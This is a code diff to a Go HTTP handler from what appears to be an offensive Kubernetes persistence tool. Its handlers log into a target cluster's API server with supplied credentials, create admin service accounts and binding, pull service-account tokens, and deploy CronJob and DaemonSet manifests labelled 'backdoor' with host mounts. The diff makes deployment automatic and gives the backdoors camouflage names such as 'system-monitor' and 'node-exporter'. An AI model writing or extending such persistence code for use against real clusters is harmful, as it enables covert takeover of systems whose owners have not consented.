@@ -2,7 +2,6 @@ package handler
 
 import (
 	"context"
-	_ "encoding/base64"
 	"fmt"
 	"net/http"
 	"time"
@@ -53,10 +52,18 @@ func (h *PersistHandler) CreateAdminSA(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.Namespace == "" { req.Namespace = "kube-system" }
-	if req.SAName == "" { req.SAName = "admin-user" }
-	if req.BindingName == "" { req.BindingName = "admin-bind" }
-	if req.TimeoutSec == 0 { req.TimeoutSec = 10 }
+	if req.Namespace == "" {
+		req.Namespace = "kube-system"
+	}
+	if req.SAName == "" {
+		req.SAName = "admin-user"
+	}
+	if req.BindingName == "" {
+		req.BindingName = "admin-bind"
+	}
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 10
+	}
 
 	server := "https://" + req.TargetHost + ":6443"
 	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
@@ -106,8 +113,12 @@ func (h *PersistHandler) GetSAToken(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.Namespace == "" { req.Namespace = "kube-system" }
-	if req.TimeoutSec == 0 { req.TimeoutSec = 10 }
+	if req.Namespace == "" {
+		req.Namespace = "kube-system"
+	}
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 10
+	}
 
 	server := "https://" + req.TargetHost + ":6443"
 	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
@@ -139,7 +150,7 @@ func (h *PersistHandler) GetSAToken(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"output": "No token secret found for SA " + req.SAName + " in " + req.Namespace})
 }
 
-// GenerateCronJob 生成 CronJob YAML，可选通过 client-go 直接创建
+// GenerateCronJob 生成 CronJob YAML，并通过 client-go 直接创建
 func (h *PersistHandler) GenerateCronJob(c *gin.Context) {
 	var req struct {
 		TargetHost string `json:"target_host" binding:"required"`
@@ -158,29 +169,30 @@ func (h *PersistHandler) GenerateCronJob(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.Namespace == "" { req.Namespace = "kube-system" }
-	if req.Schedule == "" { req.Schedule = "*/10 * * * *" }
-	if req.Image == "" { req.Image = "alpine" }
-	if req.TimeoutSec == 0 { req.TimeoutSec = 10 }
+	if req.Namespace == "" {
+		req.Namespace = "kube-system"
+	}
+	if req.Name == "" {
+		req.Name = "system-monitor"
+	}
+	if req.Schedule == "" {
+		req.Schedule = "*/10 * * * *"
+	}
+	if req.Image == "" {
+		req.Image = "alpine"
+	}
+	if req.Command == "" {
+		req.Command = "while true; do sleep 3600; done"
+	}
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 10
+	}
 
-	yaml := fmt.Sprintf(`apiVersion: batch/v1
-kind: CronJob
-metadata:
-  name: %s
-  namespace: %s
-spec:
-  schedule: "%s"
-  jobTemplate:
-    spec:
-      template:
-        spec:
-          containers:
-          - name: backdoor
-            image: %s
-            command: ["/bin/sh"]
-            args: ["-c", "%s"]
-          restartPolicy: OnFailure
-`, req.Name, req.Namespace, req.Schedule, req.Image, req.Command)
+	yaml, yamlErr := kubectl.BuildCronJobBackdoorYAML(req.Name, req.Namespace, req.Image, req.Schedule, req.Command)
+	if yamlErr != nil {
+		c.JSON(http.StatusOK, gin.H{"error": yamlErr.Error()})
+		return
+	}
 
 	server := "https://" + req.TargetHost + ":6443"
 	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
@@ -194,7 +206,7 @@ spec:
 	c.JSON(http.StatusOK, gin.H{"yaml": yaml, "applied": result, "error": errStr(applyErr)})
 }
 
-// GenerateDaemonSet 生成 DaemonSet YAML，可选通过 client-go 直接创建
+// GenerateDaemonSet 生成 DaemonSet YAML，并通过 client-go 直接创建
 func (h *PersistHandler) GenerateDaemonSet(c *gin.Context) {
 	var req struct {
 		TargetHost string `json:"target_host" binding:"required"`
@@ -213,25 +225,45 @@ func (h *PersistHandler) GenerateDaemonSet(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.Namespace == "" { req.Namespace = "kube-system" }
-	if req.MountPath == "" { req.MountPath = "/host" }
-	if req.Command == "" { req.Command = "while true; do sleep 3600; done" }
+	if req.Namespace == "" {
+		req.Namespace = "kube-system"
+	}
+	if req.Name == "" {
+		req.Name = "node-exporter"
+	}
+	if req.Image == "" {
+		req.Image = "alpine"
+	}
+	if req.MountPath == "" {
+		req.MountPath = "/host"
+	}
+	if req.Command == "" {
+		req.Command = "while true; do sleep 3600; done"
+	}
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 10
+	}
 
-	yaml := kubectl.BuildDaemonSetBackdoor(req.Name, req.Namespace, req.Image, req.MountPath, req.Command)
+	yaml, yamlErr := kubectl.BuildDaemonSetBackdoorYAML(req.Name, req.Namespace, req.Image, req.MountPath, req.Command)
+	if yamlErr != nil {
+		c.JSON(http.StatusOK, gin.H{"error": yamlErr.Error()})
+		return
+	}
 
+	server := "https://" + req.TargetHost + ":6443"
+	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
 	resp := gin.H{"yaml": yaml}
-	if req.TimeoutSec > 0 {
-		server := "https://" + req.TargetHost + ":6443"
-		client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
-		if err != nil {
-			resp["error"] = err.Error()
-		} else {
-			ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
-			defer cancel()
-			result, applyErr := client.ApplyYAML(ctx, yaml)
-			resp["applied"] = result
-			if applyErr != nil { resp["error"] = applyErr.Error() }
-		}
+	if err != nil {
+		resp["error"] = err.Error()
+		c.JSON(http.StatusOK, resp)
+		return
+	}
+	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
+	defer cancel()
+	result, applyErr := client.ApplyYAML(ctx, yaml)
+	resp["applied"] = result
+	if applyErr != nil {
+		resp["error"] = applyErr.Error()
 	}
 	c.JSON(http.StatusOK, resp)
 }
@@ -247,7 +279,9 @@ func (h *PersistHandler) GenerateKubeconfig(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	if req.Cluster == "" { req.Cluster = "pwned-cluster" }
+	if req.Cluster == "" {
+		req.Cluster = "pwned-cluster"
+	}
 
 	kcfg := fmt.Sprintf(`apiVersion: v1
 kind: Config
@@ -287,4 +321,3 @@ func (h *PersistHandler) GenerateHostPersistence(c *gin.Context) {
 	}
 	c.JSON(http.StatusOK, gin.H{"commands": cmds})
 }
-
